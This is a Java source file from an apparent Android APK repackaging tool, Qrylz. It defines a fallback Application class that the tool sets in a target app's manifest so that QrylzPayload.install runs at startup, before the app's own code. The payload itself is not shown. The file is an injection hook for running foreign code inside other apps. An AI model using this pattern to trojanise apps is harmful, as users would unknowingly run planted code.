package alienkrishn.qrylz.payload;

import android.app.Application;
import android.content.Context;

/**
 * Fallback application class.
 * <p>
 * Only used when the target APK does not declare its own application class. In that case
 * Qrylz points {@code android:name} in the manifest at this class so there is something to
 * hook the payload into.
 */
public class QrylzApplication extends Application {

    @Override
    protected void attachBaseContext(Context base) {
        QrylzPayload.install(base);
        super.attachBaseContext(base);
    }
}
